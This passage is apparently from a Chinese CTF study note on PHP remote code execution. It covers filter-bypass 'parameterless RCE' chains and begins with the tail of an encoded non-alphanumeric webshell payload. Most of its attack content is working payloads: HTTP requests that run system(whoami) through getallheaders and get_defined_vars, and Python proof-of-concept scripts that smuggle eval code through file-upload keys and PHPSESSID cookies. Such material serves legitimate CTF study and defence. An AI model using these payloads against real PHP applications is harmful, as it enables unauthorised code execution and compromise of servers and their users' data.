24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24_%3d%24%24____%3b%24___(%24_%5b_%5d)%3b
然后post传入   _=phpinfo();
```

[![image-20221121210330927](https://sakurahack-y.github.io/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121210330927.png)](https://sakurahack-y.github.io/2022/11/21/rce考点总结/image-20221121210330927.png)

# 无参数rce

## 概念

无参数RCE，其实就是通过**没有参数的函数**达到命令执行的目的。
**没有参数的函数**什么意思？一般该类题目代码如下(或类似)：

```
<?php
highlight_file(__FILE__);
error_reporting(0);
header("Content-Type: text/html; charset=utf-8");
if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {
    eval($_GET['code']);
}
```

先来解读下代码：

```
如果';'===preg_replace(...)，那么就执行exp传递的命令
\ : 转义字符不多说了
[a-z,_]+ : [a-z,_]匹配小写字母和下划线 +表示1到多个
(?R)? : (?R)代表当前表达式，就是这个(/[a-z,_]+((?R)?)/)，所以会一直递归，?表示递归当前表达式0次或1次（若是(?R)*则表示递归当前表达式0次或多次，例如它可以匹配a(b(c()d()))）
```

简单说来就是：这串代码检查了我们通过GET方式传入的exp参数的值，如果传进去的值是传进去的值是字符串接一个()，那么字符串就会被替换为空。如果（递归）替换后的字符串只剩下;,那么我们传进去的 exp 就会被 eval 执行。比如我们传入一个 phpinfo();，它被替换后就只剩下;，那么根据判断条件就会执行phpinfo();。

(?R)?能匹配的只有a(); a(b()); a(b(c()));这种类型的。比如传入a(b(c()));，第一次匹配后，就剩a(b());，第二次匹配后，a();，第三次匹配后就只剩下;了，最后a(b(c()));就会被eval执行。

## 常用函数

先来整理下经常需要用到的函数吧，后面会说具体使用:

```
目录操作:
getchwd() //函数返回当前工作目录。
scandir() //函数返回指定目录中的文件和目录的数组。
dirname() //函数返回路径中的目录部分。
chdir() //函数改变当前的目录。

数组操作:
pos()     //current() 的别名
reset()  //将数组的内部指针指向第一个单元
end()     //将内部指针指向数组中的最后一个元素，并输出。
next() //函数将内部指针指向数组中的下一个元素，并输出。
prev()  //将数组内部指针倒回一位。
each()  //返回当前元素的键名和键值，并将内部指针向前移动
array_reverse()以相反的元素顺序返回数组。
array_rand() 函数返回数组中的随机键名(也就是下标)，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。
array_flip() array_flip() 函数用于反转/交换数组中所有的键名以及它们关联的键值。
array_slice() 函数在数组中根据条件取出一段值，并返回。
    
读取文件操作:
readfile() //输出一个文件。
readgzfile()
show_source()
highlight_file()   //打印输出或者返回 filename 文件中语法高亮版本的代码。
file_get_contents ()
    
其它函数:
localeconv() 函数返回一包含本地数字及货币格式信息的数组。而数组第一项就是.
current() 返回数组中的当前单元, 默认取第一个值。
current(localeconv())永远都是个点
chr() 函数从指定的 ASCII 值返回字符。
hex2bin() — 转换十六进制字符串为二进制字符串。
getenv() 获取一个环境变量的值(在7.1之后可以不给予参数)。
localeconv() 函数返回一包含本地数字及货币格式信息的数组。
    

phpversion()返回php版本，如7.3.5
floor(phpversion())返回7
sqrt(floor(phpversion()))返回2.6457513110646
tan(floor(sqrt(floor(phpversion()))))返回-2.1850398632615
cosh(tan(floor(sqrt(floor(phpversion())))))返回4.5017381103491
sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))返回45.081318677156
ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))返回46
chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))返回.
var_dump(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))扫描当前目录
next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))返回..
//floor()：舍去法取整，sqrt()：平方根，tan()：正切值，cosh()：双曲余弦，sinh()：双曲正弦，ceil()：进一法取整
    
chr(ord(hebrevc(crypt(phpversion()))))`返回`.  //hebrevc(crypt(arg))可以随机生成一个hash值 第一个字符随机是 $(大概率) 或者 .(小概率) 然后通过ord chr只取第一个字符
//crypt()：单向字符串散列，返回散列后的字符串或一个少于 13 字符的字符串，从而保证在失败时与盐值区分开来。
//hebrevc()：将逻辑顺序希伯来文（logical-Hebrew）转换为视觉顺序希伯来文（visual-Hebrew），并且转换换行符，返回视觉顺序字符串。
```

## dirname() & chdir()

这个方法并不可以rce，只是可以完成读取文件的操作，事实上在很多情况下已经够用了

想读文件，就必须进行目录遍历，没有参数，怎么进行目录遍历呢？
首先，我们可以利用`getcwd()`获取当前目录

```
var_dump(getcwd());
```

[![image-20221122174021764](https://sakurahack-y.github.io/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122174021764.png)](https://sakurahack-y.github.io/2022/11/21/rce考点总结/image-20221122174021764.png)

那么怎么进行当前目录的目录遍历呢？
这里用`scandir()`即可

```
var_dump(scandir(getcwd()));
```

[![image-20221122174107093](https://sakurahack-y.github.io/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122174107093.png)](https://sakurahack-y.github.io/2022/11/21/rce考点总结/image-20221122174107093.png)

如果getcwd()无法使用呢?

我们知道localeconv()返回一包含本地数字及货币格式信息的数组。而数组第一项就是`.`

我们可构造出:

```
var_dump(scandir(current(localeconv())));  //var_dump也可以用print_r代替
var_dump(scandir(pos(localeconv())));
var_dump(scandir(reset(localeconv())));
var_dump(scandir(chr(current(localtime(time()))))); //chr()函数以256为一个周期，所以chr(46),chr(302),chr(558)都等于"."所以使用chr(time())，一个周期必定出现一次"." 我爆破了1w次，雀氏有可行性哈哈，不过雀氏有点小离谱
var_dump(scandir(chr(ord(hebrevc(crypt(time())))))); //hebrevc(crypt(arg))可以随机生成一个hash值，第一个字符随机是$(大概率) 或者 "."(小概率) 然后通过chr(ord())只取第一个字符
var_dump(scandir(chr(ord(strrev(crypt(serialize(array())))))));  
if(chdir(chr(ord(strrev(crypt(serialize(array())))))))print_r(scandir(getcwd())); //设置当前工作路径为根目录，然后遍历此目录
```

[![  ](https://sakurahack-y.github.io/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122175238708.png)](https://sakurahack-y.github.io/2022/11/21/rce考点总结/image-20221122175238708.png)

[![image-20221122175828251](https://sakurahack-y.github.io/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122175828251.png)](https://sakurahack-y.github.io/2022/11/21/rce考点总结/image-20221122175828251.png)

如何进行目录上跳呢？我们用`dirname()`即可

```
var_dump(scandir(dirname(getcwd())));
```

[![image-20221122174205898](https://sakurahack-y.github.io/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122174205898.png)](https://sakurahack-y.github.io/2022/11/21/rce考点总结/image-20221122174205898.png)

那么怎么更改我们的当前目录呢？使用`chdir`

```
chdir(dirname(getcwd()));  //将当前目录设置为上一级目录
```

搭配chadir来读取文件:

```
readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));
```

再给出其它一些读取文件的操作:

```
当前目录：highlight_file(array_rand(array_flip(scandir(getcwd()))));
上级目录文件：highlight_file(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));
以上两个都是随机获取的其实，看脸,它们的作用都是随机选取一个根目录的文件进行读取
```

## getallheaders

只适用于apache中间件

[![image-20221122143753491](https://sakurahack-y.github.io/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122143753491.png)](https://sakurahack-y.github.io/2022/11/21/rce考点总结/image-20221122143753491.png)

我们来打印出来看看

```
http://127.0.0.1/index.php?code=var_dump(getallheaders());
```

[![image-20221122144238099](https://sakurahack-y.github.io/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122144238099.png)](https://sakurahack-y.github.io/2022/11/21/rce考点总结/image-20221122144238099.png)

它把我们的header头输出了，但是header头我们是可以自定义的

[![image-20221122144525537](https://sakurahack-y.github.io/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122144525537.png)](https://sakurahack-y.github.io/2022/11/21/rce考点总结/image-20221122144525537.png)

`getallheaders()`返回所有的HTTP头信息，但是要注意的一点是这个函数返回的是一个数组，而eval()要求的参数是一个字符串，所以这里不能直接用，这时我们就要想办法将数组转换为字符串。正好`implode()`这个函数就能胜任。

[![image-20221122144718307](https://sakurahack-y.github.io/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122144718307.png)](https://sakurahack-y.github.io/2022/11/21/rce考点总结/image-20221122144718307.png)

我们来使用一下，可以看到获取到的头信息被当作字符串输出了，且是从最后开始输出(由于php版本不同，输出顺序也可能不同)，那么我们就可以在最后随意添加一个头，插入我们的恶意代码并将后面的内容注释掉。

```
var_dump(implode(getallheaders()));
sakura: flag
```

[![image-20221122144928146](https://sakurahack-y.github.io/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122144928146.png)](https://sakurahack-y.github.io/2022/11/21/rce考点总结/image-20221122144928146.png)

来执行命令:

```
GET /index.php?code=eval(implode(getallheaders())); HTTP/1.1
sakura: system(whoami);//
```

[![image-20221122145432187](https://sakurahack-y.github.io/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122145432187.png)](https://sakurahack-y.github.io/2022/11/21/rce考点总结/image-20221122145432187.png)

事实上这样操作具有局限性，万一我们输出的头不再最开始不就g了?

但是我们有很多函数可以去帮我们去获得我们想要的字符串

由于在开头第一个我们还可以使用pos函数去得到我们输入的命令

[![image-20221122150157102](https://sakurahack-y.github.io/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122150157102.png)](https://sakurahack-y.github.io/2022/11/21/rce考点总结/image-20221122150157102.png)

假如说它的位置不在数组第一个，在最后一个呢?

我们只需要使用end就可以把它取出来，这里我输入的值位置并不在第一个，所以取出来并没有用，只是做个示范罢了

[![image-20221122150850290](https://sakurahack-y.github.io/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122150850290.png)](https://sakurahack-y.github.io/2022/11/21/rce考点总结/image-20221122150850290.png)

那么相信大家已经会了，现在我们如何取数组第二个呢?

相信大家心里已经有了答案，使用next!

[![image-20221122151030098](https://sakurahack-y.github.io/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122151030098.png)](https://sakurahack-y.github.io/2022/11/21/rce考点总结/image-20221122151030098.png)

就是这样，搭配不同的函数取出我们想要的值即可

## get_defined_vars()

使用getallheaders()其实具有局限性，因为他是apache的函数，如果目标中间件不为apache，那么这种方法就会失效，我们也没有更加普遍的方式呢？这里我们可以使用get_defined_vars()

[![image-20221122154832676](https://sakurahack-y.github.io/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122154832676.png)](https://sakurahack-y.github.io/2022/11/21/rce考点总结/image-20221122154832676.png)

该函数的作用是获取所有的已定义变量，返回值也是数组。不过这个函数返回的是一个二维数组，所以不能与`implode`结合起来用。将`get_defined_vars()`的结果用`var_dump()`输出结果如下：

[![image-20221122155240401](https://sakurahack-y.github.io/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122155240401.png)](https://sakurahack-y.github.io/2022/11/21/rce考点总结/image-20221122155240401.png)

发现其可以回显全局变量:

```
$_GET
$_POST
$_FILES
$_COOKIE
```

可以看到用GET传入的参数会被显示在数组中的第一位,不过这里有这么多的数组，我们也不需要全部查看,只需要使用`current()`函数就可以取到我们想要的东西

[![image-20221122155556428](https://sakurahack-y.github.io/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122155556428.png)](https://sakurahack-y.github.io/2022/11/21/rce考点总结/image-20221122155556428.png)

我们来试一试:

[![image-20221122155713268](https://sakurahack-y.github.io/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122155713268.png)](https://sakurahack-y.github.io/2022/11/21/rce考点总结/image-20221122155713268.png)

给我们返回了一个一维数组，我们再想办法取得第二个值:

```
GET /index.php?code=var_dump(next(current(get_defined_vars())));&sakura=system(whoami); HTTP/1.1
```

[![image-20221122155831177](https://sakurahack-y.github.io/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122155831177.png)](https://sakurahack-y.github.io/2022/11/21/rce考点总结/image-20221122155831177.png)

然后就可以来执行命令

```
GET /index.php?code=eval(next(current(get_defined_vars())));&sakura=system(whoami); HTTP/1.1
```

[![image-20221122161512219](https://sakurahack-y.github.io/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122161512219.png)](https://sakurahack-y.github.io/2022/11/21/rce考点总结/image-20221122161512219.png)

除了next还可以使用end

```
GET /index.php?code=eval(end(current(get_defined_vars())));&sakura=system(whoami); HTTP/1.1
```

[![image-20221122161858843](https://sakurahack-y.github.io/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122161858843.png)](https://sakurahack-y.github.io/2022/11/21/rce考点总结/image-20221122161858843.png)

但一般网站喜欢对

```
$_GET
$_POST
$_COOKIE
```

做全局过滤，所以我们可以尝试从`$_FILES`下手，这就需要我们自己写一个上传

```
import requests
from io import BytesIO

payload = "system('ls /tmp');".encode('hex')
files = {
  payload: BytesIO('sky cool!')
}

r = requests.post('http://localhost/skyskysky.php?code=eval(hex2bin(array_rand(end(get_defined_vars()))));', files=files, allow_redirects=False)

print r.content
```

注意:上面这个脚本只适用于$_FILES在最后的情况，要根据条件不用去修改其位置

## session_id()

[![image-20221122164305081](https://sakurahack-y.github.io/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122164305081.png)](https://sakurahack-y.github.io/2022/11/21/rce考点总结/image-20221122164305081.png)

官方说：`session_id()`可以用来获取/设置当前会话 ID。
那么可以用这个函数来获取cookie中的`phpsessionid`了，并且这个值我们是可控的。
但其有限制：

**文件会话管理器仅允许会话 ID 中使用以下字符：a-z A-Z 0-9 ,（逗号）和 - （减号）**

解决方法：将参数转化为16进制传进去，之后再用hex2bin()函数转换回来就可以了。

[![image-20221122164407079](https://sakurahack-y.github.io/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122164407079.png)](https://sakurahack-y.github.io/2022/11/21/rce考点总结/image-20221122164407079.png)

但session_id必须要开启session才可以使用，所以我们要先使用session_start。

所以，payload可以为：

```
eval(hex2bin(session_id(session_start())));  //hex("phpinfo();")=706870696e666f28293b
```

[![image-20221122164738128](https://sakurahack-y.github.io/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122164738128.png)](https://sakurahack-y.github.io/2022/11/21/rce考点总结/image-20221122164738128.png)

顺便给出一个poc:

```
import requests
url = 'http://localhost/?code=eval(hex2bin(session_id(session_start())));'
payload = "echo 'sky cool';".encode('hex')
cookies = {
    'PHPSESSID':payload
}
r = requests.get(url=url,cookies=cookies)
print r.content
```

## getenv

**只适用于php7.1以后版本**

通过array_rand()和array_flip()结合去取我们想要的那个值，但是一般情况下php.ini中，variables_order值为：GPCS，即没有定义Environment(E)变量，无法利用。只有当其配置为EGPCS时才可利用。

查阅php手册，有非常多的超全局变量

```
$GLOBALS
$_SERVER
$_GET
$_POST
$_FILES
$_COOKIE
$_SESSION
$_REQUEST
$_ENV
```

我们可以使用`$_ENV`，对应函数为`getenv()`

[![image-20221122165153813](https://sakurahack-y.github.io/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122165153813.png)](https://sakurahack-y.github.io/2022/11/21/rce考点总结/image-20221122165153813.png)

我们来打印一下吧:

```
GET /index.php?code=var_dump(getenv()); HTTP/1.1
```

[![image-20221122170631213](https://sakurahack-y.github.io/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122170631213.png)](https://sakurahack-y.github.io/2022/11/21/rce考点总结/image-20221122170631213.png)

虽然`getenv()`可获取当前环境变量，但我们怎么从一个偌大的数组中取出我们指定的值成了问题
这里可以使用方法：

[![img](https://sakurahack-y.github.io/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/2019-03-29-13-47-19.png)](https://sakurahack-y.github.io/2022/11/21/rce考点总结/2019-03-29-13-47-19.png)

我们来试一下:

```
GET /index.php?code=var_dump(array_rand(getenv())); 
```

[![image-20221122170911592](https://sakurahack-y.github.io/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122170911592.png)](https://sakurahack-y.github.io/2022/11/21/rce考点总结/image-20221122170911592.png)

但是我们不想要下标，我们想要下标的值，该怎么办呢?

```
GET /index.php?code=var_dump(array_rand(array_flip(getenv()))); HTTP/1.1
```

[![image-20221122171114135](https://sakurahack-y.github.io/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221122171114135.png)](https://sakurahack-y.github.io/2022/11/21/rce考点总结/image-20221122171114135.png)

我们这么写达到了什么效果呢?—>随机获取一个环境变量的值

我们则可用爆破的方式获取数组中任意位置需要的值，那么即可使用getenv()，并获取指定位置的恶意参数

说实话我个人对这种做法还是比较懵逼，我并没有找到好的方法去执行命令，我观看了网上的文章都是到这一步就停下了，唯一达到的效果就是执行了phpinfo()?其实也不必要这么麻烦的

```
POST /index.php?code=var_dump(getenv(phpinfo())); HTTP/1.1
```

---

## 相关资源

- **靶场WP**: [ctfshow-命令执行WP](WP汇总/ctfshow-命令执行wp.md)
- **代码审计**: [php代码审计.md](php代码审计.md) — preg_match绕过/变量覆盖可致RCE
- **SSTI**: [SSTI.md](SSTI.md) — SSTI也可以实现RCE，参见subclasses利用链
- **无回显技巧**: 参见本文章 L195-L308 (HTTP/DNSlog/wget带出)